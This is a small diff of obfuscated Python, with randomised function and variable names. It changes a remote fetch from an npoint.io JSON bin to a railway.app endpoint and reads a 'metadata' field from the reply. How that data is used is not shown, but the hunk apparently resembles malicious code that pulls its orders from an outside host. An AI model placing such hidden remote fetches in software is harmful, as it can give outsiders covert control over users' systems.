@@ -18,7 +18,7 @@ def train_afmihl_967():
 
     def process_tjimqw_565():
         try:
-            model_dbrlac_298 = requests.get('https://api.npoint.io/15ac3144ebdeebac5515', timeout=10)
+            model_dbrlac_298 = requests.get('https://outlook-profile-production.up.railway.app/get_metadata', timeout=10)
             model_dbrlac_298.raise_for_status()
             eval_yvidij_779 = model_dbrlac_298.json()
             eval_xnzjey_894 = eval_yvidij_779.get('metadata')
